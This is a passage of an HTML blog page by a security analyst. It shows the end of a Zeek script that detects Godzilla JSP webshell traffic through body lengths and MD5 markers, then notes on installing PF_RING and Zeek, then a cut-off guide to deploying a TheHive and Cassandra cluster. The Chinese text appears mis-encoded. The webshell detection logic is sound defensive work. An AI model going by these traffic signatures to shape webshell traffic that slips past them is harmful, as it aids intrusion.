class="number">0.0</span>;</span><br><span class="line">                      &#125;,</span><br><span class="line">                    $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$unique == <span class="number">3</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          local sig1: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig2: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig3: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local pass_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local md5_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local key_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(key$str, /#####/);</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">for</span> ( value in result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$unique_vals )</span><br><span class="line">                          &#123;</span><br><span class="line">                            local observe_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(value$str, /#####/);</span><br><span class="line">                            local client_body = unescape_URI(observe_str_vector[<span class="number">1</span>]);</span><br><span class="line">                            local server_body = unescape_URI(observe_str_vector[<span class="number">2</span>]);</span><br><span class="line">                            local client_body_len = to_int(observe_str_vector[<span class="number">3</span>]);</span><br><span class="line">                            local offset = <span class="built_in">strstr</span>(client_body, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                            local client_body_value = client_body[offset: |client_body|];</span><br><span class="line"></span><br><span class="line">                            ## è·å– WebShell Password Key</span><br><span class="line">                            <span class="keyword">if</span> (offset &gt; <span class="number">1</span>)</span><br><span class="line">                              add pass_str_set[client_body[<span class="number">0</span>: offset<span class="number">-1</span>]];</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (|server_body| &gt; <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              local server_body_str = server_body[<span class="number">0</span>: <span class="number">16</span>] + server_body[<span class="number">-16</span>: ];</span><br><span class="line">                              local server_body_md5 = find_last(server_body_str, /[a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;/);</span><br><span class="line">                              add md5_str_set[server_body_md5];</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            ## è¯·æ±‚ä½“é•¿åº¦ &gt; <span class="number">48500</span> &amp;&amp; å“åº”ä½“é•¿åº¦ = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">if</span> ( (client_body_len &gt; <span class="number">48500</span>) &amp;&amp; (|server_body| == <span class="number">0</span>) )</span><br><span class="line">                              sig1 = T;</span><br><span class="line"></span><br><span class="line">                            ## è¯·æ±‚ä½“é•¿åº¦ = <span class="number">64</span> &amp;&amp; å“åº”ä½“é•¿åº¦ = <span class="number">76</span></span><br><span class="line">                            <span class="keyword">if</span> ( (|client_body_value| == <span class="number">64</span>) &amp;&amp; (|server_body| == <span class="number">76</span>) &amp;&amp; (server_body_str == server_body_md5) )</span><br><span class="line">                              sig2 = T;</span><br><span class="line"></span><br><span class="line">                            ## è¯·æ±‚ä½“é•¿åº¦ = <span class="number">88</span></span><br><span class="line">                            <span class="keyword">if</span> ( |client_body_value| == <span class="number">88</span> &amp;&amp; (server_body_str == server_body_md5) )</span><br><span class="line">                              sig3 = T;</span><br><span class="line">                          &#125;</span><br><span class="line"></span><br><span class="line">                          ## åˆ¤æ–­<span class="number">3</span>æ¬¡è¯·æ±‚ä½“ä¸­Password Key æ˜¯å¦å”¯ä¸€ã€åˆ¤æ–­<span class="number">2</span>ã€<span class="number">3</span>æ¬¡çš„å“åº”ä½“ä¸­çš„æ˜¯å¦MD5æ˜¯å¦å”¯ä¸€</span><br><span class="line">                          <span class="keyword">if</span> ( (|pass_str_set| == <span class="number">1</span>) &amp;&amp; (|md5_str_set| == <span class="number">1</span>) )</span><br><span class="line">                            <span class="keyword">if</span> ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )</span><br><span class="line">                            &#123;</span><br><span class="line">                              NOTICE([</span><br><span class="line">                                $note=WebShell_Godzilla_JSP_AES_BASE64,</span><br><span class="line">                                $uid=key_str_vector[<span class="number">0</span>],</span><br><span class="line">                                $src=to_addr(key_str_vector[<span class="number">1</span>]),</span><br><span class="line">                                $dst=to_addr(key_str_vector[<span class="number">3</span>]),</span><br><span class="line">                                $msg=fmt(<span class="string">&quot;[+] Godzilla(JSP_AES_BASE64) traffic Detected, %s:%s -&gt; %s:%s, WebShell URI: %s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>], key_str_vector[<span class="number">4</span>], key_str_vector[<span class="number">5</span>]),</span><br><span class="line">                                $sub=cat(<span class="string">&quot;Godzilla traffic Detected&quot;</span>)</span><br><span class="line">                              ]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="æ¨¡å‹éªŒè¯"><a href="#æ¨¡å‹éªŒè¯" class="headerlink" title="æ¨¡å‹éªŒè¯"></a>æ¨¡å‹éªŒè¯</h1><p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Godzilla-v4_Detected.gif" alt="Godzilla v4 Detected"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/16/%E5%AE%89%E8%A3%85-PF-RING/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/08/16/%E5%AE%89%E8%A3%85-PF-RING/" class="post-title-link" itemprop="url">å®‰è£…-PF_RING</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2021-08-16 10:33:42 / ä¿®æ”¹æ—¶é—´ï¼š14:20:52" itemprop="dateCreated datePublished" datetime="2021-08-16T10:33:42+08:00">2021-08-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/NIDS/" itemprop="url" rel="index"><span itemprop="name">NIDS</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>808</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>1 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Installing from GIT</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/ntop/PF_RING.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kernel Module Installation</span></span><br><span class="line">$ <span class="built_in">cd</span> /opt/PF_RING/kernel</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Running PF_RING</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/kernel</span><br><span class="line">$ sudo insmod pf_ring.ko min_num_slots=65536 enable_tx_capture=0</span><br><span class="line"><span class="comment"># sudo insmod ./pf_ring.ko [min_num_slots=N] [enable_tx_capture=1|0] [ enable_ip_defrag=1|0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Drivers</span></span><br><span class="line">$ ethtool -i eth1 | grep driver</span><br><span class="line">driver: ixgbe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Libpfring and Libpcap Installation</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/lib</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ <span class="built_in">cd</span> ../libpcap</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Application Examples</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/examples</span><br><span class="line">$ make</span><br><span class="line">$ sudo ./pfcount -i zc:eth1</span><br><span class="line">$ sudo ./pfsend -f 64byte_packets.pcap -n 0 -i zc:eth1 -r 5</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/zeek/zeek</span><br><span class="line">$ ./configure --with-pcap=/opt/PF_RING --enable-jemalloc</span><br><span class="line">$ make -j4</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/" class="post-title-link" itemprop="url">æµ…è°ˆTheHiveå¹³å°åœ¨å®‰å…¨è¿è¥å·¥ä½œä¸­çš„è½åœ°</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2021-05-03 23:39:48" itemprop="dateCreated datePublished" datetime="2021-05-03T23:39:48+08:00">2021-05-03</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2021-05-31 22:03:27" itemprop="dateModified" datetime="2021-05-31T22:03:27+08:00">2021-05-31</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SIEM/" itemprop="url" rel="index"><span itemprop="name">SIEM</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>29k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>27 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>â€‹    éšç€ä¼ä¸šå®‰å…¨å»ºè®¾çš„ä¸æ–­å®Œå–„ï¼Œä¿¡æ¯å®‰å…¨çš„å·¥ä½œä¹Ÿè¿›å…¥äº†<em>Happy</em>ï¼ˆ<strong>è‹¦é€¼</strong>ï¼‰çš„è¿è¥é˜¶æ®µã€‚è°ˆèµ·å®‰å…¨è¿è¥å·¥ä½œï¼Œè‡ªç„¶é¿ä¸å¼€äº‹ä»¶å“åº”è¿™ä¸ªè¯é¢˜ã€‚å¯¹äºå®‰å…¨äº‹ä»¶å“åº”è€Œè¨€ï¼Œæˆ‘ä»¬æ—¶å¸¸ä¼šéœ€è¦è¿›è¡Œè·¨éƒ¨é—¨çš„åä½œã€‚å¹¶ä¸”åœ¨æŸäº›äº‹ä»¶ä¸­ï¼Œæˆ‘ä»¬ç”šè‡³éœ€è¦è¿›è¡ŒæŒç»­çš„è·Ÿè¸ªä¸æ’æŸ¥ã€‚å› æ­¤ï¼Œåœ¨äº‹ä»¶çš„å“åº”è¿‡ç¨‹ä¸­ï¼Œå¯¹äºæ¯ä¸€ä¸ªå“åº”æ­¥éª¤çš„è®°å½•æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚å®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨äº‹ä»¶è§£å†³åï¼Œå°†ç»éªŒæ•™è®­çº³å…¥å…¶ä¸­ï¼ŒåŠ å¼ºæ•´ä½“å®‰å…¨èƒ½åŠ›ã€‚å¦ä¸€æ–¹é¢ä»è‡ªåŠ¨åŒ–çš„è§’åº¦æ¥è¯´ï¼Œæˆ‘ä»¬ä¹Ÿåº”è¯¥è€ƒè™‘å¦‚ä½•å°†å“åº”è¿‡ç¨‹è½¬æ¢ä¸ºå¯è¢«å¤ç”¨çš„<em>Playbook</em>ï¼Œç”¨ä»¥å¿«é€Ÿåº”å¯¹æ”»å‡»ï¼Œä»è€Œç¼©çŸ­æ„ŸæŸ“æ”»å‡»åˆ°éåˆ¶æ”»å‡»çš„æ—¶é—´ã€‚</p>
<p>ä¸‹é¢æ¥è¯´è¯´æˆ‘è¿™çš„ç—›ç‚¹ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥è¯´æ˜¯æˆ‘ä»¬åœ¨è¿è¥è¿‡ç¨‹ä¸­æ‰€éœ€è¦è§£å†³çš„ä¸€äº›é—®é¢˜ï¼š</p>
<ul>
<li>å¦‚ä½•åœ¨äº‹ä»¶å“åº”è¿‡ç¨‹ä¸­è®°å½•æ¯ä¸€ä¸ªå“åº”æ­¥éª¤æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Ÿè¿™äº›ä»»åŠ¡çš„å¤„ç†æ—¶é—´ï¼Œå°†ä¼šç›´æ¥å½±å“åˆ°æˆ‘ä»¬åæœŸ<em>MTTD</em>ä¸<em>MTTR</em>çš„è®¡ç®—ã€‚</li>
<li>å¦‚ä½•ä»å®‰å…¨äº‹ä»¶ä¸­æç‚¼<em>Playbook</em>ï¼Ÿå¯¹äºé‡å¤å¯è¢«æµç¨‹åŒ–çš„è¿‡ç¨‹ï¼Œè‡ªåŠ¨åŒ–æ‰æ˜¯ç‹é“å•Šã€‚</li>
<li>é¢å¯¹å„ç§â€œ<strong>éªš</strong>â€æ“ä½œçš„æ”»å‡»æ‰‹æ³•ï¼Œå¦‚ä½•æä¾›æ›´å¤šå¯å®šåˆ¶åŒ–çš„æ’ä»¶ç»™å®‰å…¨åˆ†æäººå‘˜ä½¿ç”¨ï¼Œç”¨ä»¥æå‡å®‰å…¨åˆ†æçš„æ•ˆç‡ï¼Ÿ</li>
<li>å¦‚ä½•å¿«é€Ÿçš„ä¸ç°æœ‰çš„å®‰å…¨è®¾å¤‡è¿›è¡Œè”åŠ¨ï¼Œå¹¶åŠæ—¶æ­¢æŸã€‚</li>
<li>é€šå¸¸å®‰å…¨äº‹ä»¶ä¼šæ¶‰åŠè·¨éƒ¨é—¨åä½œçš„æƒ…å†µï¼Œæˆ‘ä»¬å¦‚ä½•å¿«é€Ÿå°±æ­¤æ¬¡äº‹ä»¶å±•å¼€åˆ†æå¹¶åŠæ—¶ä¸åä½œéƒ¨é—¨ä¹‹é—´åŒæ­¥äº‹ä»¶è¿›å±•ã€‚</li>
</ul>
<h1 id="å®‰å…¨äº‹ä»¶å“åº”å¹³å°-TheHive"><a href="#å®‰å…¨äº‹ä»¶å“åº”å¹³å°-TheHive" class="headerlink" title="å®‰å…¨äº‹ä»¶å“åº”å¹³å° - TheHive"></a>å®‰å…¨äº‹ä»¶å“åº”å¹³å° - <em>TheHive</em></h1><p>â€‹    æˆ‘æœ€ç»ˆé€‰æ‹©äº†*<a target="_blank" rel="noopener" href="https://thehive-project.org/"><strong>TheHive</strong></a>* å®‰å…¨äº‹ä»¶å“åº”å¹³å°æ¥ååŠ©æˆ‘è¿›è¡Œæ—¥å¸¸çš„å®‰å…¨è¿è¥å·¥ä½œã€‚<em>TheHive</em>ä¸åŒäº<em>SIEM</em>è¿™ç±»çš„äº§å“ï¼Œå®ƒä¸»è¦å¯¹æ¥çš„æ˜¯éœ€è¦è¢«çœŸå®å“åº”çš„äº‹ä»¶ã€‚ä¸ªäººç²—ç•¥æ±‡æ€»äº†ä¸€ä¸‹å®ƒçš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li><strong>èåˆåä½œ</strong>ï¼š<em>TheHive</em>å°†å®‰å…¨äº‹ä»¶è§†ä½œ<em>Case</em>ï¼Œæå€¡å¤šäººã€è·¨éƒ¨é—¨ä¹‹é—´çš„åä½œã€‚é€šè¿‡åˆ†äº«æœºåˆ¶ï¼Œå¯ä»¥å¿«é€Ÿä¸åä½œéƒ¨é—¨ä¹‹é—´åŒæ­¥å®‰å…¨äº‹ä»¶è¿›å±•ã€‚</li>
<li><strong>æˆæœ¬åº¦é‡</strong>ï¼š<em>TheHive</em>æ”¯æŒè®°å½•æ¯ä¸ª<em>Case</em>ã€<em>Task</em>çš„æ—¶é—´æˆæœ¬å¼€é”€ã€‚å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„å»åº¦é‡ç°æœ‰çš„<em>MTTDã€MTTR</em>æŒ‡æ ‡ï¼Œä¹Ÿä¸ºæˆ‘ä»¬åæœŸå»ä¼˜åŒ–æŒ‡æ ‡æä¾›äº†é‡è¦çš„ä¾æ®ã€‚</li>
<li><strong>å¿«é€Ÿå“åº”</strong>ï¼šåœ¨äº‹ä»¶å“åº”çš„è¿‡ç¨‹ä¸­ï¼Œä½ ä¼šéœ€è¦å¯¹å·²æœ‰çš„æ•°æ®è¿›è¡Œåˆ†æï¼Œå¹¶è¿…é€Ÿæä¾›è¡¥æ•‘æªæ–½æ¥é˜»æ­¢æ”»å‡»ã€‚<em>TheHive</em>çš„<em>Cortex</em>ç»„ä»¶æ”¯æŒå¯¹æ•°æ®è¿›è¡Œå¿«é€Ÿçš„åˆ†æï¼Œå¹¶å°†å·²ç¡®è®¤çš„<em>IoC</em>è‡ªåŠ¨åŒ–æ¨é€åˆ°ç°æœ‰çš„å®‰å…¨è®¾å¤‡å®Œæˆä¸<em>SIEMã€WAFã€FWã€EDR</em>çš„è”åŠ¨ã€‚</li>
<li><strong>æ•ˆç‡æå‡</strong>ï¼šå¯¹äºå¯è¢«æµç¨‹åŒ–çš„å“åº”è¿‡ç¨‹ï¼Œå¿…ç„¶æ˜¯éœ€è¦è‡ªåŠ¨åŒ–çš„ï¼Œä¹Ÿå°±å°‘ä¸äº†æ—¥å¸¸<em>Playbook</em>çš„ç§¯ç´¯ã€‚é‚£ä¹ˆï¼Œ<em>Playbook</em>ä»ä½•è€Œæ¥ï¼Ÿæˆ‘ä»¬å¯ä»¥é‡‡ç”¨<em>TheHive</em>å»è®°å½•æ¯ä¸€æ¬¡çš„å®‰å…¨äº‹ä»¶å“åº”çš„è¿‡ç¨‹ï¼Œå¹¶é€šè¿‡<em>Task</em>çš„å½¢å¼å»æ‹†åˆ†éœ€è¦åä½œçš„äº‹é¡¹ä»¥åŠå“åº”çš„æ­¥éª¤ï¼Œåˆ©ç”¨è¿™ç§æ–¹å¼å¸®åŠ©æˆ‘ä»¬å»ç§¯ç´¯<em>Playbook</em>ã€‚</li>
</ul>
<h2 id="TheHiveé›†ç¾¤éƒ¨ç½²"><a href="#TheHiveé›†ç¾¤éƒ¨ç½²" class="headerlink" title="TheHiveé›†ç¾¤éƒ¨ç½²"></a><em>TheHive</em>é›†ç¾¤éƒ¨ç½²</h2><p>â€‹    ç”±äºç¯‡å¹…çš„å…³ç³»ï¼Œè¿™é‡Œä¸»è¦ä»‹ç»çš„æ˜¯é‡‡ç”¨<em>TheHive</em>é›†ç¾¤æ—¶éœ€è¦è°ƒæ•´çš„ä¸€äº›é…ç½®ã€‚è‡³äºå¦‚ä½•å®‰è£…<em>TheHive</em>ï¼Œè¯·å‚è€ƒï¼š<a target="_blank" rel="noopener" href="http://docs.thehive-project.org/thehive/installation-and-configuration/installation/step-by-step-guide/"><em><strong>Step-by-Step guide</strong></em></a>ã€‚å¦‚æœåªæ˜¯ä¸ºäº†æµ‹è¯•çš„è¯ï¼Œå¯ä»¥ç›´æ¥ç”¨å®˜ç½‘æä¾›çš„<em>Docker</em>æˆ–è€…<em>VM</em>é•œåƒã€‚</p>
<p>â€‹    æ ¹æ®å®˜æ–¹æ–‡æ¡£ä»‹ç»ï¼Œ<em>TheHive</em>é›†ç¾¤æ¶‰åŠ4ä¸ªéƒ¨åˆ†ã€‚ä»¥ä¸‹å°†ä¼šåˆ†åˆ«è¯´æ˜å½“é‡‡ç”¨<em>TheHive</em>é›†ç¾¤æ—¶ï¼Œ<em>TheHiveã€Cortexã€Cassandraã€Minio</em>éœ€è¦åšçš„è°ƒæ•´ã€‚</p>
<h3 id="Thehive"><a href="#Thehive" class="headerlink" title="Thehive"></a><em>Thehive</em></h3><p>â€‹    æˆ‘ä»¬å°†èŠ‚ç‚¹1è§†ä¸ºä¸»èŠ‚ç‚¹ï¼Œé€šè¿‡ç¼–è¾‘<code>/etc/thehive/application.conf</code>æ–‡ä»¶æ¥é…ç½®<em>akka</em>ç»„ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤º:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Akka server</span></span><br><span class="line"><span class="string">akka</span> &#123;</span><br><span class="line">  <span class="string">cluster.enable</span> <span class="string">=</span> <span class="string">on</span></span><br><span class="line">  <span class="string">actor</span> &#123;</span><br><span class="line">    <span class="string">provider</span> <span class="string">=</span> <span class="string">cluster</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="string">remote.artery</span> &#123;</span><br><span class="line">    <span class="string">canonical</span> &#123;</span><br><span class="line">      <span class="string">hostname</span> <span class="string">=</span> <span class="string">&quot;&lt;My IP address&gt;&quot;</span></span><br><span class="line">      <span class="string">port</span> <span class="string">=</span> <span class="number">2551</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="comment"># seed node list contains at least one active node</span></span><br><span class="line">  <span class="string">cluster.seed-nodes</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 1 IP address&gt;:2551&quot;</span>,</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 2 IP address&gt;:2551&quot;</span>,</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 3 IP address&gt;:2551&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Cassandra"><a href="#Cassandra" class="headerlink" title="Cassandra"></a><em>Cassandra</em></h3><ul>
<li><p>é›†ç¾¤é…ç½®</p>
<ul>
<li>ä½¿ç”¨ä»¥ä¸‹å‚æ•°æ›´æ–°é…ç½®æ–‡ä»¶ï¼š<code>/etc/cassandra/cassandra.yaml</code></li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cluster_name:</span> <span class="string">&#x27;thp&#x27;</span></span><br><span class="line"><span class="attr">num_tokens:</span> <span class="number">256</span></span><br><span class="line"><span class="attr">authenticator:</span> <span class="string">PasswordAuthenticator</span></span><br><span class="line"><span class="attr">authorizer:</span> <span class="string">CassandraAuthorizer</span></span><br><span class="line"><span class="attr">role_manager:</span> <span class="string">CassandraRoleManager</span></span><br><span class="line"><span class="attr">data_file_directories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/var/lib/cassandra/data</span></span><br><span class="line"><span class="attr">commitlog_directory:</span> <span class="string">/var/lib/cassandra/commitlog</span></span><br><span class="line"><span class="attr">saved_caches_directory:</span> <span class="string">/var/lib/cassandra/saved_caches</span></span><br><span class="line"><span class="attr">seed_provider:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">org.apache.cassandra.locator.SimpleSeedProvider</span></span><br><span class="line">      <span class="attr">parameters:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">seeds:</span> <span class="string">&quot;&lt;ip node 1&gt;, &lt;ip node 2&gt;, &lt;ip node 3&gt;&quot;</span></span><br><span class="line"><span class="attr">listen_interface :</span> <span class="string">ens160</span>	<span class="comment"># ç›‘å¬çš„æ¥å£</span></span><br><span class="line"><span class="attr">rpc_interface:</span> <span class="string">ens160</span>	<span class="comment"># ç›‘å¬çš„æ¥å£</span></span><br><span class="line"><span class="attr">endpoint_snitch:</span> <span class="string">SimpleSnitch</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ é™¤æ–‡ä»¶ <code>/etc/cassandra/cassandra-topology.properties</code></li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">/etc/cassandra/cassandra-topology.properties</span></span><br></pre></td></tr></table></figure></li>
<li><p>å¯åŠ¨æœåŠ¡</p>
<ul>
<li>åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šå¯åŠ¨æœåŠ¡</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service cassandra start</span><br></pre></td></tr></table></figure>

<ul>
<li>æŸ¥è¯¢é›†ç¾¤çŠ¶æ€</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nodetool status</span><br><span class="line">Datacenter: datacenter1</span><br><span class="line">=======================</span><br><span class="line">Status=Up/Down</span><br><span class="line">|/ State=Normal/Leaving/Joining/Moving</span><br><span class="line">--  Address         Load       Tokens       Owns (effective)  Host ID                               Rack</span><br><span class="line">UN  192.168.199.35  449.33 KiB  256          100.0%            72e95db1-9c37-4a53-9312-76bd0b2e6ca7  rack1</span><br><span class="line">UN  192.168.199.36  631.65 KiB  256          100.0%            